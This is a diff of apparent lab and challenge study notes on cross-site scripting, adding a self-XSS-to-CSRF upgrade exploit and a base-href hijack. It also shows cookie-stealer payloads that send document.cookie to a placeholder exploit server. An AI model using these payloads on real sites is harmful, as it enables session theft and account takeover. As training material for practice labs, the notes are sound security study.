@@ -351,7 +351,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 + [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
 
->CSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks.
+>CSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks. Example is the missing `base-uri` allow to use exploit method describe at alternative method for [Upgrade stored self-XSS](#upgrade-stored-self---xss).  
 
 + [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
   
@@ -682,7 +682,7 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
 <video src="https://EXPLOIT.net/video"></video>
 ```  
   
->Below log of requests on exploit server show which of the above tags worked.  
+>Below log entries show the requests made to the exploit server, and from the logs we can ***identify*** that `/img` and `/video` of the above tags were allowed on the application and made requests when accessed.  
 
 ![Identify-stored-xss](images/identify-stored-xss.png)  
 
@@ -698,7 +698,9 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
 ?productId=1&storeId="></select><img src=x onerror=this.src='https://exploit.net/?'+document.cookie;>
 ```  
 
->Stored XSS Blog post  
+#### Stored XSS Blog Post  
+
+>Stored XSS Blog post cookie stealer sending document cookie to exploit server.  
 
 ```JavaScript
 <script>
@@ -723,6 +725,41 @@ body:document.cookie
 ```  
 
 [PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
+
+#### Upgrade stored self-XSS  
+
+>Blog comment with **Stored self-XSS**, upgrading the payload to steal information such as to steal the victim name. The CSRF token for the **write comment** is same as the **edit blog** functions. Combining CSRF and XSS enable attacker to make the below payload to trick victim in using **write comment**. The `a` character is to escape the `#` hash character from the initial application `source code`. The below `source code` in the blog entry is full exploit to steal victim info.  
+
+```html
+<button form=comment-form formaction="/edit" id=share-button>Click Button</button>
+<input form=comment-form name=content value='<meta http-equiv="refresh" content="1; URL=/edit" />'>
+<input form=comment-form name=tags value='a");alert(document.getElementsByClassName("navbar-brand")[0].innerText)//'> 
+
+```  
+
+>Sending url that reference the above blog entry to the victim will trigger XSS as them.  
+
+```
+https://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1
+```  
+
+>The content is reflected on the page we use `meta http-equiv` tag to refresh `/edit` page after 1 second. This target is exploited by constructing an HTML injection that clobbers a variable named `share_button` and uses XSS code above.  
+
+[intigriti - Self-XSS upgrade - Solution to December 22 XSS Challenge](https://youtu.be/FowbZ8IlU7o)  
+
+>Alternative exploit using HTML injection in the Edit Content blog entry page, ***identified*** using [XSS Resources CSP check](#xss-resources).  
+
+```
+<base href="https://Exploit.net">
+```  
+
+>Host JS file on Exploit server as `static/js/bootstrap.bundle.min.js`, with content:  
+
+```
+alert(document.getElementsByClassName("navbar-brand")[0].innerText)
+```  
+
+[PortSwigger Lab: Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)  
 
 ### Stored DOM XSS  
 
